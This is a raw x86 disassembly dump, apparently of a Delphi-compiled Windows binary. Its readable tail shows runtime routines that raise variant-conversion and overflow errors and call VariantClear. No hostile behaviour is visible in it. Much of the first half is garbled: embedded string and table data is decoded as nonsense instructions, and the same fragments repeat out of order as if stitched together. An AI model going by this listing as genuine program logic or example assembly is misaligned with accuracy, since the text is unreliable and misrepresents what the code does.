add [ eax ] al
inc ebp
push esi
popad
jb r-xdata
add al dh
xor al 0x40
add ah bh
jo r-xdata
popad
je r-xdata
add [ eax ] al
cwde
jpe r-xdata
inc eax
add [ edi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
out 0x40 eax
add [ eax + eax ] cl
inc eax
add [ edi ] dh
inc eax
outsd
jb r-xdata
popad
je r-xdata
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jmp 0x4ce94a
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
outsd
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x17004032 ] bl
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
push 0x6f727245
dec esi
jne r-xdata
jbe r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
je r-xdata
inc eax
add [ eax - 0x18 ] ch
inc eax
int3
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x4ce81a
outsd
shl [ eax ] 0xe9
call 0xffffffff8c25373d
mov ebx eax
xor eax eax
push ebp
push sub_40ea2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41411c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41411c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea36
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
insb
dec edi
jo r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
inc eax
add [ esi + 0x34f80040 ] al
inc eax
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x1a004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor cl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
sub ah ah
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
outsd
jb r-xdata
jb r-xdata
add [ ebp - 0x5c1703bb ] cl
push esi
jb r-xdata
das
0xff640040 0x6430
retn
popad
outsb
je r-xdata
rcl [ ebp + 0x68 ] 0x96
jmp 0xffffffffffa4e99b
jb r-xdata
outsd
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jns r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
retn
outsb
sub_40e7fa
inc eax
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x17004032 ] bl
jne r-xdata
jbe r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
int3
dec edi
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
inc eax
add [ esi + 0x34f80040 ] al
inc eax
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x1a004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor cl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
sub ah ah
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
outsd
jb r-xdata
outsd
jb r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
call 0x4ce8e6
add [ eax ] al
cwde
jpe r-xdata
inc ebp
jb r-xdata
das
0xff640040 0x6430
retn
popad
outsb
je r-xdata
rcl [ ebp + 0x68 ] 0x96
jmp 0xffffffffffa4e99b
outsd
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jb r-xdata
push 0x6f727245
dec esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jmp 0x4ce94a
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
outsd
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
retn
outsb
shl [ eax ] 0xe9
call 0xffffffff8c25373d
mov ebx eax
xor eax eax
push ebp
push sub_40ea2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41411c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41411c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea36
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
insb
dec edi
jo r-xdata
je r-xdata
inc eax
add [ eax - 0x18 ] ch
inc eax
add [ ebp - 0x5c1703bb ] cl
push esi
jb r-xdata
add [ eax + 0x18004032 ] bl
inc ebp
push esi
inc eax
insd
add [ eax ] al
add al dh
xor al 0x40
add ah bh
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
outsd
jb r-xdata
jb r-xdata
inc eax
add [ eax ] al
call sub_40e7fa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc eax
add [ eax + eax ] cl
popad
jns r-xdata
add [ eax ] al
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
popad
jb r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
inc eax
add [ esi + 0x34f80040 ] al
inc eax
jb r-xdata
je r-xdata
jo r-xdata
popad
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
pop ss
dec bp
insd
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x4ce81a
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ edi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0040 ] bl
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x14004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add al dh
xor al 0x40
dec ecx
inc eax
add [ edi ] dh
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x18004032 ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add al dh
xor al 0x40
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xe7
outsd
jb r-xdata
outsb
je r-xdata
popad
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
jb r-xdata
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
jb r-xdata
popad
outsb
je r-xdata
ror ah 0xe6
inc eax
add [ eax ] al
popad
jb r-xdata
popad
add [ 0x35040040 ] dh
popad
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dh
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x18004032 ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
outsb
js r-xdata
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
jns r-xdata
inc eax
add al bh
xor al 0x40
add [ 0x35040040 ] dh
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
jb r-xdata
add [ eax ] al
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
sub_40e8c6
inc eax
jbe r-xdata
popad
outsb
je r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
inc eax
add [ esi + 0x34f80040 ] al
inc eax
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
das
0xff640040 0x6430
outsd
jb r-xdata
retn
popad
outsb
je r-xdata
rcl [ ebp + 0x68 ] 0x96
jmp 0xffffffffffa4e99b
outsd
jb r-xdata
push 0x6f727245
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
retn
outsb
popad
outsb
je r-xdata
shl [ eax ] 0xe9
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jmp 0x4ce94a
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x1a004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor cl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
sub ah ah
inc eax
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
outsd
jb r-xdata
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x17004032 ] bl
inc ebp
push esi
popad
jb r-xdata
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jae r-xdata
popad
je r-xdata
dec esi
jne r-xdata
call 0xffffffff8c25373d
mov ebx eax
xor eax eax
push ebp
push sub_40ea2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41411c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41411c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea36
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
insb
dec edi
jo r-xdata
add [ ebp - 0x5c1703bb ] cl
push esi
jb r-xdata
sub_40e94c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e996
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40e9a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41411c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41411c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea36
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
sub_40ea3c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea86
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea8d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40ea90
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eada
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eae1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40eae4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eb73
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41411c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41411c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb7a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
sub_40eb80
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ebca
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebd1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40ebd4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ee19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee20
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_40405c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
dec eax
je r-xdata
call sub_40e94c
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
jmp r-xdata
call sub_40ea3c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b1c8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
jmp r-xdata
jmp r-xdata
sub_40ee34
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e9a0
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40eae4
jmp r-xdata
jmp r-xdata
call sub_40ebd4
sub_40ee68
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40275c
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ee34
pop esi
pop ebx
retn
call sub_40275c
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ee34
jmp r-xdata
call sub_40279c
mov edx eax
mov eax edx
call sub_403a74
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ee34
jmp r-xdata
pop esi
pop ebx
retn
sub_40eeec
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ef36
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef3d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40ef54
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ef84
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ef84
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40efe0
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee28
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ee28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ef54
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
